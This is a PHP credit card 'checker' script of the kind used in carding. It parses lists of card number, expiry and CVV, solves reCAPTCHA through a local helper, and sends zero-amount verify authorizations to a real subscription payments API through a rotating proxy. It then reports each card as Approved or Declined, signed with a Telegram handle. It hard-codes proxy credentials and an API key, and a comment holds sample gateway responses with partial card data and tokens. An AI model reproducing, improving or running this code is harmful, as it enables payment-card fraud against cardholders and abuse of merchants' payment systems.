<?php
error_reporting(0);
ignore_user_abort();
date_default_timezone_set('America/Sao_Paulo');

##########################################################################################

function getStr($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
die('<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">Lista inválida...</span> ➔ <span class="badge badge-warning">Suporte: @pladixoficial</span><br>');
}

$lista = $lista[0];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];

if (strlen($mes) == 1){
  $mes = "0$mes";
}

if (strlen($ano) == 2){
  $ano = "20$ano";
}

if (strlen($ano) == 4){
  $ano2 = substr($ano, 2);
}

$numeros = rand(11111,99999);
$inicio = microtime(true);

##########################################################################################

$captchav3 = file_get_contents('http://localhost/amazonpay/nextcapv3.php?website_url=https://paymentcapture.resin.com&website_key=6Lcu_7oiAAAAABFnepbhkEVNi7Okol20Tw980y28');
$json = json_decode($captchav3);
$grecaptcha = $json->gRecaptchaResponse;
$encryptpan = file_get_contents('http://localhost:4848/amazonpay?cardnumber='.$cc.'');
$json = json_decode($encryptpan);
$creditCardNumber = $json->resultado;

##########################################################################################

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://payments-api.cloud.buysub.com/pw',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_PROXY => 'gw.dataimpulse.com:823',
  CURLOPT_PROXYUSERPWD => '3aa9901655b2ffc3d97b:b6be13f7620aaab6',
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"configurationId":"c52a4ba4-38ed-411f-9512-f17da62540cb","prodIdAlias":"WIS","recaptchaResponse":"'.$grecaptcha.'","appSource":"engage","CVC":false,"addressVerificationCodes":[],"paymentService":"CPS","oneTimeAuthorization":{"actionCode":"verify","transactionType":"7","creditCardNumber":"'.$creditCardNumber.'","creditCardType":"MC","creditCardCVV":"","creditCardExpireMonth":"'.$mes.'","creditCardExpireYear":"'.$ano2.'","amount":"000","currencyCode":"840","countryCode":"","merchantOrderId":"f25e56af","creditCardEncrypted":true,"encryptionSource":"CDS","tokenize":true,"address":{"name":"","addressLine1":"","city":"","state":"","postalCode":""}},"pwTransSource":"PC"}',
  CURLOPT_HTTPHEADER => [
    'content-type: application/json',
    'host: payments-api.cloud.buysub.com',
    'origin: https://paymentcapture.resin.com',
    'referer: https://paymentcapture.resin.com/',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'x-api-key: BqrybIofE34HlwAj1JsRJ5zKdMVp7NSK44ReAhJU'
  ],
]);

$resp = curl_exec($curl);
curl_close($curl);

$fim = microtime(true);
$tempoTotal = $fim - $inicio;
$tempoFormatado = number_format($tempoTotal, 2);

/* recusada -> {"pwRespMessage":"Fail","pwPaymentType":"CC","pwResponse":{"transactionId":2485355422,"success":false,"sentToOffline":false,"userFixableError":"","prodIdAlias":"WIS","message":"","systemName":"CPS","transactionDescription":"One Time Authorization","oneTimeAuthorizations":[{"actionCode":"verify","transactionType":"7","tokenize":true,"creditCardType":"MC","countryCode":"","currencyCode":"840","amount":"000","creditCardExpireMonth":"12","creditCardExpireYear":"25","creditCardEncrypted":true,"encryptionSource":"CDS","authorizationDate":"01292025","creditCardLastFour":"7791","authorizationCode":" ","cpsTransactionId":"10085455278","responseCode":"401","clientCompany":"WIS","transactionStatus":"NOT CAPTURED","cvvStatus":"1","avsResponse":"34","address":{"name":"","addressLine1":"","city":"","state":"","postalCode":""},"merchantOrderId":"f25e56af"}]},"pwRespCode":"401","pwRespDescription":""} 

aprovada -> {"pwRespMessage":"Success","pwPaymentType":"CC","pwResponse":{"transactionId":2485357242,"success":true,"sentToOffline":false,"userFixableError":"","prodIdAlias":"WIS","message":"","systemName":"CPS","transactionDescription":"One Time Authorization","oneTimeAuthorizations":[{"actionCode":"verify","transactionType":"7","token":"1905186240049327","tokenize":true,"creditCardType":"MC","countryCode":"","currencyCode":"840","amount":"000","creditCardExpireMonth":"03","creditCardExpireYear":"29","creditCardEncrypted":true,"encryptionSource":"CDS","authorizationDate":"01292025","creditCardLastFour":"9327","authorizationCode":"FCP99H","cpsTransactionId":"10085455322","responseCode":"104","clientCompany":"WIS","transactionStatus":"CAPTURED","cvvStatus":"1","avsResponse":"34","address":{"name":"","addressLine1":"","city":"","state":"","postalCode":""},"merchantOrderId":"f25e56af"}]},"pwRespCode":"104","pwRespDescription":"Card Payment Auth or Verify Transaction is successfully completed"}

*/

if (strpos($resp, '"transactionStatus":"CAPTURED"')){

die('<span class="text-success">Approved</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão verificado com sucesso. </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning">@pladixoficial</span><br>');

} elseif (strpos($resp, '"transactionStatus":"NOT CAPTURED"')) {

die('<span class="text-danger">Declined</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Cartão inexistente. </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning">@pladixoficial</span><br>');

} elseif (strpos($resp, '"success":false,"')) {

die('<span class="text-danger">Declined</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Cartão inexistente. </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning">@pladixoficial</span><br>');

} else {

die('<span class="text-danger">Declined</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Cartão inválida. </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning">@pladixoficial</span><br>');

}

?>

